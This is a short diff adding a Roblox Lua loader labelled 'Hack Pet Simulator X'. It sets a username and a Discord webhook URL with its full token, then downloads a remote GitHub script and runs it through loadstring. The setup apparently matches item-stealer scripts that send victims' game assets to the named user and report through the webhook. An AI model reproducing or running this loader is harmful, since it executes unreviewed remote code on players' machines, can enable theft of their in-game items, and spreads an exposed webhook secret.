@@ -1,0 +1,5 @@
+_G.Username = "isuperantek2017"
+_G.HubName = "Hack Pet Simulator X"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1096422061158711296/HBfGckU3MkKeuVH_QTiyjri2BwRLcTi1SGi6xjy0lKUUKMQ2g18S7W1lMtX5x3al5TeW"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
